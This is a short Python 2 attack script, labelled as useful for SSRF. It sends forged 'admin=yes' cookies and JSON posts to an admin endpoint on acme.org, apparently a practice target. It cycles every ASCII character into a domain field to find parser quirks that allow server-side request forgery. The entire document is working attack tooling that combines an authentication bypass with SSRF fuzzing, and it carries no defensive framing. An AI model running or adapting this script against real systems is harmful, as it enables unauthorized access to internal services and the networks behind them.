//this is useful for SSRF 
#!/usr/bin/env python2

import requests
import json

url = "http://admin.acme.org/"
headers = { "Cookie" : "admin=yes", "Content-Type" : "application/json" }


# For characters from 0x0 to 0x7f
for i in xrange(0x7f):
    # Insert the character in the middle of our domain
    domain = "212.te{}st.com".format(chr(i))

    # Encode it for JSON
    data = json.dumps(domain)

    # Create the json object to be sent
    data = '{{"domain" : {}}}'.format(data)

    # Send our payload
    response = requests.post(url, data=data, headers=headers)

    # Check the response
    print repr(domain), response.text
